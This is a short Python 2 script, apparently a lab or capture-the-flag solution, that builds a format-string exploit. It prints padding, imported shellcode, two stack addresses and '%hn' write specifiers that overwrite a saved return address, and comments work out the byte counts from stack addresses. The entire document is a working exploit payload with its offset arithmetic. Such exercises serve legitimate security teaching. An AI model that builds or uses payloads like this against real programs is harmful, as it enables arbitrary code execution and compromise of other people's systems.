from shellcode import shellcode


print "A"*9+shellcode+"\x0c\xbf\xfe\xbf\x0e\xbf\xfe\xbf"+"%46816x%12$hn%02294x%13$hn"

#shellcode 0xbffff568 or 0xbffeb708
#9+23+8 = 40
#0xbfff - 40 = 0xbfd7 = 49111 at 0xbffebf0e
#0xf568 - 0xbfff = 0x3569 = 13673 at 0xbffebf0c

#0xb708 - 40 = 0xb6e0 = 46816 at 0xbffebf0c
#0xbffe - 0xb708 = 0x8f6 = 2294 at 0xbffebf0e
#3 + 8 +1 +1
#ebp            0xbffebf08
#ret 0xbffebf0c
#"\x08\xbf\xfe\xbf\x0a\xbf\xfe\xbf"+"%00000x%12$hp%00000x%13$hp"